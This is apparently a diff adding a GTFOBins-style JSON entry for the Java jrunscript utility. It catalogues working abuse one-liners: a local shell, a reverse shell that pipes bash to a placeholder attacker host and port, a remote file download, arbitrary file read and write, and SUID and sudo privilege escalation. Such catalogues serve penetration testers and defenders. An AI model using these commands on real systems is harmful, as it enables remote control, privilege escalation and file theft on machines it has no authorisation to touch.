@@ -1,0 +1,43 @@
+{
+  "description": "This tool is installed starting with Java SE 6.",
+  "functions": {
+    "shell": [
+      {
+        "code": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "jrunscript -e 'var p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(\"[host]\",[port]);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "jrunscript -e \"cp('[url]','[file]')\"\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "jrunscript -e 'var fw=new java.io.FileWriter(\"[file]\"); fw.write(\"DATA\"); fw.close();'"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"[file]\")); while ((line = br.readLine()) != null) { print(line); }'"
+      }
+    ],
+    "suid": [
+      {
+        "description": "This has been found working in macOS but failing on Linux systems.",
+        "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
+      }
+    ]
+  }
+}
